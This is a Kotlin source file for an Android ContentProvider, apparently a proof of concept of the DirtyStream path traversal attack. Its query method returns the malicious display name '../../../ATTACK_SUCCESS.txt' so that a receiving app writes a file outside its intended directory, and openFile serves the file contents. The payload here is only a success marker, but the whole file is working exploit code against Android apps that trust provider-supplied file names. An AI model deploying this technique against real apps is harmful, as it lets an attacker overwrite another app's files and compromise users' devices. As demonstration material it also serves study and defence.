package com.example.dirtystream.attack

import android.content.ContentProvider
import android.content.ContentValues
import android.database.Cursor
import android.database.MatrixCursor
import android.net.Uri
import android.os.ParcelFileDescriptor
import android.provider.OpenableColumns
import android.util.Log
import java.io.File
import java.io.FileOutputStream

class MaliciousContentProvider : ContentProvider() {

    companion object {
        private const val TAG = "MaliciousProvider"
    }

    override fun onCreate(): Boolean {
        Log.d(TAG, "✅ MaliciousContentProvider created")
        return true
    }

    override fun query(
        uri: Uri,
        projection: Array<String>?,
        selection: String?,
        selectionArgs: Array<String>?,
        sortOrder: String?
    ): Cursor {

        Log.d(TAG, "🔍 Query called for URI: $uri")

        val cursor = MatrixCursor(arrayOf(
            OpenableColumns.DISPLAY_NAME,
            OpenableColumns.SIZE
        ))

        // 🚨 MALICIOUS FILENAME WITH PATH TRAVERSAL!
        val maliciousFileName = "../../../ATTACK_SUCCESS.txt"
        val attackPayload = "🚨 DIRTYSTREAM ATTACK SUCCESSFUL! 🚨\nFile written via path traversal vulnerability!"

        cursor.addRow(arrayOf(
            maliciousFileName,  // This causes path traversal!
            attackPayload.length
        ))

        Log.d(TAG, "🔥 Returning malicious filename: '$maliciousFileName'")
        return cursor
    }

    override fun openFile(uri: Uri, mode: String): ParcelFileDescriptor? {
        Log.d(TAG, "📁 openFile called for URI: $uri")

        return try {
            val tempFile = File.createTempFile("attack_", ".txt", context?.cacheDir)

            FileOutputStream(tempFile).use { output ->
                val payload = "🚨 DIRTYSTREAM ATTACK SUCCESSFUL! 🚨\n\nThis file was created by the DirtyStream attack.\nThe vulnerable app trusted our malicious filename '../../../ATTACK_SUCCESS.txt'\nand wrote the file outside its intended directory!"
                output.write(payload.toByteArray())
            }

            Log.d(TAG, "✅ Created attack file: ${tempFile.absolutePath}")
            ParcelFileDescriptor.open(tempFile, ParcelFileDescriptor.MODE_READ_ONLY)

        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to create attack file", e)
            null
        }
    }

    // Required ContentProvider methods
    override fun insert(uri: Uri, values: ContentValues?): Uri? = null
    override fun delete(uri: Uri, selection: String?, selectionArgs: Array<String>?): Int = 0
    override fun update(uri: Uri, values: ContentValues?, selection: String?, selectionArgs: Array<String>?): Int = 0
    override fun getType(uri: Uri): String = "text/plain"
}